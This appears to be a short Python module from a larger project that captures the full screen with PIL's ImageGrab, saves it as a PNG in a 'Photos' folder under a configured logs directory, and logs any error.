from PIL import ImageGrab
from os import makedirs
from os.path import join
from manager.logger import Log
from preferences.config import config

def Screenshot():
    try:
        screen = ImageGrab.grab()
        makedirs(join(config.pathToLogs, "Photos"), exist_ok=True)
        screen.save(join(config.pathToLogs, "Photos", "screenshot.png"), format="png")
    except Exception as e:
        Log(f"Screenshot ---> {e}")